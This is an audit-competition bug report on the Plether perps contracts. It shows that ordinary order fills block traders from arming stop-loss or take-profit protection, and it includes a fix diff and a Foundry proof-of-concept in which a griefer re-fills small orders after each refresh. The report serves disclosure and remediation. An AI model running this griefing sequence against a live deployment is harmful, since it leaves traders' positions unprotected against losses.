# \#98708 [SC-Low] any order fill blocks every trader from arming, replacing or attaching a stop-loss or take-profit until someone pays for a separate live refresh, so a griefer can keep a victim's position unprotected by re-filling after each refresh

**Submitted on Nov 9th 2026 at 17:54:23 UTC by @farismaulana for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98708
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

a trader arms a stop-loss or take-profit by calling `createPositionProtection`, `replacePositionProtection` or `commitOpenOrderWithProtection`. all three first read the oracle's accepted live basket and require it to be at least as new as the Engine mark. order fills move the Engine mark forward but never update the accepted basket. so after any fill by anyone, every protection creation, replacement and protected open reverts `PletherOracle__PriceOutOfOrder`, even in a live market that is neither paused nor frozen, until someone lands a separate paid live refresh. the next fill breaks it again, and fills are permissionless: a griefer who commits a small order of its own and has it executed after each refresh keeps the victim from arming protection.

the protocol's own guard for this check is written to accept an accepted basket that is behind the Engine mark. that branch never runs, because the oracle call before it reverts first. the revert was introduced by the fix for the prior audit's MED-28.

## Vulnerability Details

historical order fills install their mark in the Engine (`OrderRouterExecutionSidecar.sol#L1053-L1061`):

```solidity
    function _updateEngineMark(
        IOrderRouterExecutionHost host,
        OracleResult memory result
    ) private {
        ICfdEngineCore engine_ = ICfdEngineCore(host.engine());
@>      if (result.publishTime > engine_.lastMarkTime()) {
@>          engine_.updateMarkPrice(result.neutralMarkPrice, result.publishTime);
        }
    }
```

the oracle's accepted basket is written only by live updates, inside `_resolveCurrentBasket` (`PletherOracle.sol#L795-L798`). the historical path that prices fills writes no basket state:

```solidity
        for (uint256 i; i < len; ++i) {
            _acceptedPrices[i] = feeds[i].price;
        }
@>      _acceptedBasket = basket;
```

so after a fill, the Engine mark time is newer than the accepted basket time.

every protection entry point first calls `_freshProtectionObservation` (`PositionProtectionBook.sol#L229`, `#L295`, `#L463`). it reads the current price from the oracle (`PositionProtectionBook.sol#L880`):

```solidity
@>      IPletherOracle.PriceSnapshot memory current = oracle.getLatestPrice(IPletherOracle.PriceMode.MarkRefresh);
        currentMarkPrice = current.markPrice;
        currentPublishTime = current.publishTime;
@>      if (!_acceptedMarkInstalled()) {
            revert PositionProtectionBook__OracleMarkAhead();
        }
```

in a live market, `getLatestPrice` rebuilds the accepted basket and enforces publish order against the Engine mark (`PletherOracle.sol#L575-L578`, `#L892-L896`):

```solidity
            : _acceptedLiveBasket(mode, policy.maxStaleness, _policyPublishTimeDivergence(mode, policy));
@>      snapshot = _snapshotFromBasket(basket, policy, true);
        ...
        if (enforcePublishOrder) {
            uint64 markTime = engine.lastMarkTime();
@>          if (snapshot.publishTime < markTime) {
@>              revert PletherOracle__PriceOutOfOrder(snapshot.publishTime, markTime);
            }
```

this reverts whenever the accepted basket is behind the Engine mark, which is the normal state after a fill.

the guard right after it was built for exactly this state. `_acceptedMarkInstalled` returns true when the accepted basket is older than the Engine mark, and rejects only an accepted mark that is ahead or inconsistent (`PositionProtectionBook.sol#L888-L895`):

```solidity
        uint64 markTime = ENGINE.lastMarkTime();
@>      return acceptedTime < markTime || (acceptedTime == markTime && acceptedPrice == ENGINE.lastMarkPrice());
```

the `acceptedTime < markTime` branch is dead: the call before it has already reverted in that case. the result is the opposite of what the guard encodes. the arming check accepts only an Engine mark that no fill has touched since the last live refresh.

this is a new bug introduced by the MED-28 fix. commit `81919218` (PR #120) moved current pricing to the accepted live basket and left fills writing only the Engine mark. the MED-28 fix (commit `8f6cfd3d`, PR #124) then made protection arming read `getLatestPrice(MarkRefresh)`, which inherits the oracle's publish-order check. the MED-28 disposition says the guard "rejects arming when the accepted oracle mark is ahead of, or inconsistent with, the Engine mark". it does not reject an accepted mark that is behind, and the guard's own code allows that case. the interface states the conditions under which creation is unavailable: "Router pause blocks creation and replacement; cancellation, triggering, and retry remain available" (`IPositionProtectionActions.sol#L14`). an ordinary fill by an unrelated trader is not among them.

reproduction path:

1. a keeper calls `OrderRouter.updateMarkPrice` with a live payload. the accepted basket and the Engine mark are at the same time `T`.
2. an unrelated trader's order is filled by any keeper through `executeOrder`, at a historical tick `H > T`. the Engine mark moves to `H`, and the accepted basket stays at `T`.
3. the victim calls `createPositionProtection` on its live position. it reverts `PletherOracle__PriceOutOfOrder(T, H)`.
4. the victim's call succeeds only after a separate live `updateMarkPrice`, which pays the Pyth update fee, lands after the fill and before the create. any further fill in between breaks it again.

## Impact Details

1. traders cannot arm, replace or attach a stop-loss or take-profit in a live market after any order fill. every fill by any trader moves the Engine mark past the accepted basket, and creation stays blocked until the next paid live refresh lands with no fill after it.
2. a griefer keeps a specific victim unprotected. fills are permissionless: the griefer commits a small order of its own and any keeper executes it. one fill after each of the victim's refreshes puts the Engine mark ahead again. the PoC repeats this for three consecutive refreshes, and the victim's stop-loss creation reverts every time.
3. each attempt costs the victim a Pyth update fee for the refresh plus gas, and the refresh buys nothing once another fill lands before the create.
4. a trader who cannot arm a stop-loss carries the position unprotected through the move the stop was meant to cap. a stop-loss exists to bound that loss, and this defect removes it.
5. the MED-28 guard `_acceptedMarkInstalled` is written to allow an accepted basket that is behind the Engine mark. that branch is unreachable, so the MED-28 fix blocks arming in the state its own guard was built to accept.

this maps to the in-scope Medium impact "Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)": a griefer, or ordinary order flow, denies traders the protection feature the interface promises outside a Router pause, and leaves their positions exposed to the losses that feature exists to cap.

## Recommendation

read the protection baseline from the accepted basket without the publish-order check, and keep `_acceptedMarkInstalled` as the synchronization guard, since it already rejects an accepted mark that is ahead of, or inconsistent with, the Engine mark. `_snapshotFromBasket` already takes the flag that controls this check:

```diff
 // PletherOracle: a view for protection arming that skips only the ordering check
+    function getAcceptedProtectionSnapshot() external view returns (PriceSnapshot memory snapshot) {
+        PolicySnapshot memory policy = _policyForMode(PriceMode.MarkRefresh);
+        BasketPrice memory basket = _acceptedLiveBasket(
+            PriceMode.MarkRefresh, policy.maxStaleness, _policyPublishTimeDivergence(PriceMode.MarkRefresh, policy)
+        );
+        snapshot = _snapshotFromBasket(basket, policy, false);
+    }

 // PositionProtectionBook._freshProtectionObservation
-        IPletherOracle.PriceSnapshot memory current = oracle.getLatestPrice(IPletherOracle.PriceMode.MarkRefresh);
+        IPletherOracle.PriceSnapshot memory current = oracle.getAcceptedProtectionSnapshot();
```

alternatively, have historical fills that advance the Engine mark also advance the accepted basket, so the two writers stay ordered.

## References

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouterExecutionSidecar.sol#L1053-L1061

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L795-L798

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L571-L580

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L892-L896

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L862-L895

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L229

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L295

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L463

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/interfaces/IPositionProtectionActions.sol#L11-L14

https://github.com/Plether-Fi/plether-core/pull/124

## Proof of Concept

## Proof of Concept

the test deploys the repo contracts through the suite's `BasePerpTest` with the release risk parameters, and mocks only Pyth (`MockPyth`) and USDG (`MockSettlementToken`). the victim's position, the other trader's orders and the live refreshes all go through the production Router (`commitOrder`, keeper `executeOrder`, `updateMarkPrice`), and protection is created through the production `PositionProtectionBook`.

- `test_unrelatedFillBlocksStopLossCreation`:
  - after a live refresh, an unrelated trader's order is filled;
  - the test asserts the fill moved the Engine mark but left the accepted basket unchanged;
  - the victim's `createPositionProtection` reverts with the exact `PletherOracle__PriceOutOfOrder(acceptedTime, markTime)`;
  - it succeeds only after another live refresh.
- `test_griefersOwnFillRebreaksEveryRefresh`: three times in a row, the victim pays for a live refresh, the griefer's own small order is committed and filled, and the victim's `createPositionProtection` reverts `PriceOutOfOrder`.
- `test_control_refreshThenCreateSucceeds`: with no fill after the refresh, the same creation succeeds.

create `packages/perps/test/perps/poc/ProtectionArmAfterFill.t.sol` with this content:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IPletherOracle} from "@plether/perps/interfaces/IPletherOracle.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console2} from "forge-std/console2.sol";

/// @title an ordinary order fill moves the Engine mark ahead of the oracle's accepted live basket, so creating
///        TP/SL protection reverts PriceOutOfOrder until someone pays for a separate live mark refresh.
/// @dev Historical fills install their mark in the Engine (OrderRouterExecutionSidecar.sol:1053-1060) but never write
///      the oracle's accepted basket (only PletherOracle.sol:796-798 does). PositionProtectionBook._freshProtectionObservation
///      (PositionProtectionBook.sol:862-886) calls getLatestPrice(MarkRefresh), which rebuilds the accepted basket and
///      enforces publishTime >= engine.lastMarkTime() (PletherOracle.sol:891-896).
contract ProtectionArmAfterFillTest is BasePerpTest {

    address internal constant VICTIM = address(0xA11CE);
    address internal constant OTHER_TRADER = address(0xB0B);
    address internal constant KEEPER = address(0x4EE9);

    uint256 internal constant PRICE = 1e8;
    uint256 internal constant STOP_LOSS = 102_000_000; // LONG stop-loss above the mark
    uint256 internal constant SIZE = 100_000e18;
    uint256 internal constant MARGIN = 20_000e6;
    uint256 internal constant DEPOSIT = 50_000e6;

    IPositionProtectionActions internal book;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function setUp() public override {
        super.setUp();
        book = IPositionProtectionActions(address(router.positionProtectionBook()));
        assertEq(engine.executionFeeBps(), 4, "release executionFeeBps");
        assertEq(router.maxExecutionWindowSeconds(), 60, "release execution window");

        // The victim holds a LONG; another trader has a funded account.
        _open(VICTIM, CfdTypes.Side.LONG);
        _fundTrader(OTHER_TRADER, DEPOSIT);
    }

    /// @notice Control: with no fill after the live refresh, the victim arms its stop-loss.
    function test_control_refreshThenCreateSucceeds() public {
        _refreshMark(PRICE);
        uint64 protectionId = _createStopLoss(VICTIM);
        assertGt(protectionId, 0, "stop-loss armed");
    }

    /// @notice Any order fill after the last live refresh makes the victim's create revert PriceOutOfOrder.
    function test_unrelatedFillBlocksStopLossCreation() public {
        _refreshMark(PRICE);
        (, uint256 acceptedPriceBefore, uint64 acceptedTimeBefore) =
            router.pletherOracle().getAcceptedBasketMark();

        // An unrelated trader's order is filled by a keeper at a historical tick newer than the last live refresh.
        _tick();
        vm.prank(OTHER_TRADER);
        uint64 orderId = router.commitOrder(CfdTypes.Side.SHORT, SIZE / 10, MARGIN / 10, 0, false);
        bytes[] memory data = _mockPythUpdateData(PRICE);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, data);
        assertEq(uint256(result.status), uint256(OrderV3Types.LifecycleStatus.Executed), "unrelated fill executed");

        uint64 markTime = engine.lastMarkTime();
        (, uint256 acceptedPriceAfter, uint64 acceptedTimeAfter) = router.pletherOracle().getAcceptedBasketMark();
        console2.log("accepted basket time (unchanged by the fill)", acceptedTimeAfter);
        console2.log("engine mark time after the fill            ", markTime);
        assertEq(acceptedTimeAfter, acceptedTimeBefore, "fill did not update the accepted basket");
        assertEq(acceptedPriceAfter, acceptedPriceBefore, "fill did not update the accepted basket price");
        assertGt(markTime, acceptedTimeAfter, "engine mark is now ahead of the accepted basket");

        // The victim's stop-loss creation reverts, although the market is live and not paused or frozen.
        PositionProtectionTypes.PositionProtectionParams memory params = _stopLossParams();
        vm.prank(VICTIM);
        vm.expectRevert(
            abi.encodeWithSelector(IPletherOracle.PletherOracle__PriceOutOfOrder.selector, acceptedTimeAfter, markTime)
        );
        book.createPositionProtection(params);

        // It only succeeds after someone pays for a separate live mark refresh.
        _refreshMark(PRICE);
        uint64 protectionId = _createStopLoss(VICTIM);
        assertGt(protectionId, 0, "stop-loss armed only after a separate live refresh");
    }

    /// @notice Each time the victim pays for a live refresh, one fill of the griefer's own small order (commit, then any
    ///         keeper executes it) puts the Engine mark ahead again, and the victim's stop-loss creation reverts again.
    function test_griefersOwnFillRebreaksEveryRefresh() public {
        uint256 cycles = 3;
        for (uint256 i; i < cycles; ++i) {
            // Victim pays for a live refresh so it can arm its stop-loss.
            _refreshMark(PRICE);

            // Griefer commits a small order of its own and has it filled before the victim's create lands.
            _tick();
            vm.prank(OTHER_TRADER);
            uint64 orderId = router.commitOrder(CfdTypes.Side.SHORT, SIZE / 100, MARGIN / 100, 0, false);
            bytes[] memory data = _mockPythUpdateData(PRICE);
            vm.prank(KEEPER);
            OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, data);
            assertEq(uint256(result.status), uint256(OrderV3Types.LifecycleStatus.Executed), "griefer fill executed");

            (,, uint64 acceptedTime) = router.pletherOracle().getAcceptedBasketMark();
            uint64 markTime = engine.lastMarkTime();
            PositionProtectionTypes.PositionProtectionParams memory params = _stopLossParams();
            vm.prank(VICTIM);
            vm.expectRevert(
                abi.encodeWithSelector(IPletherOracle.PletherOracle__PriceOutOfOrder.selector, acceptedTime, markTime)
            );
            book.createPositionProtection(params);
            console2.log("cycle", i + 1, ": victim paid refresh, griefer fill, create reverted");
        }
    }

    // ---------------------------------------------------------------------
    // Helpers
    // ---------------------------------------------------------------------

    function _open(
        address account,
        CfdTypes.Side side
    ) internal {
        _fundTrader(account, DEPOSIT);
        _tick();
        vm.prank(account);
        uint64 orderId = router.commitOrder(side, SIZE, MARGIN, 0, false);
        bytes[] memory data = _mockPythUpdateData(PRICE);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, data);
        assertEq(uint256(result.status), uint256(OrderV3Types.LifecycleStatus.Executed), "open executed");
    }

    function _stopLossParams() internal pure returns (PositionProtectionTypes.PositionProtectionParams memory params) {
        params.stopLossTriggerPrice = STOP_LOSS;
        params.closeLimits = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
    }

    function _createStopLoss(
        address account
    ) internal returns (uint64 protectionId) {
        PositionProtectionTypes.PositionProtectionParams memory params = _stopLossParams();
        vm.prank(account);
        protectionId = book.createPositionProtection(params);
    }

    /// @dev Permissionless live refresh through the Router, one tick newer than the Engine mark.
    function _refreshMark(
        uint256 price
    ) internal {
        if (vm.getBlockTimestamp() <= engine.lastMarkTime()) {
            vm.warp(uint256(engine.lastMarkTime()) + 1);
        }
        vm.roll(vm.getBlockNumber() + 1);
        vm.prank(KEEPER);
        router.updateMarkPrice(_livePriceData(price));
    }

    function _livePriceData(
        uint256 price
    ) internal view returns (bytes[] memory updateData) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        uint256 previous = engine.lastMarkTime();
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] = MockPyth.FeedUpdate(
                ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, vm.getBlockTimestamp(), previous)
            );
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(ticks);
    }

    function _tick() internal {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
    }

}
```

run it from `packages/perps`:

```bash
forge test --match-path test/perps/poc/ProtectionArmAfterFill.t.sol -vv
```

output:

```bash
Ran 3 tests for test/perps/poc/ProtectionArmAfterFill.t.sol:ProtectionArmAfterFillTest
[PASS] test_control_refreshThenCreateSucceeds() (gas: 1130747)
[PASS] test_griefersOwnFillRebreaksEveryRefresh() (gas: 7048224)
Logs:
  cycle 1 : victim paid refresh, griefer fill, create reverted
  cycle 2 : victim paid refresh, griefer fill, create reverted
  cycle 3 : victim paid refresh, griefer fill, create reverted

[PASS] test_unrelatedFillBlocksStopLossCreation() (gas: 3715662)
Logs:
  accepted basket time (unchanged by the fill) 1709535603
  engine mark time after the fill             1709535605

Suite result: ok. 3 passed; 0 failed; 0 skipped; finished in 22.01ms (17.84ms CPU time)
```

the unrelated fill moves the Engine mark to 1709535605 while the accepted basket stays at 1709535603, and the victim's `createPositionProtection` reverts with exactly `PletherOracle__PriceOutOfOrder(1709535603, 1709535605)` in a live, unpaused market. in the griefing test, three consecutive paid refreshes are each followed by one fill of the griefer's own order, and the victim's creation reverts after every one. with no fill after the refresh, the same creation succeeds.
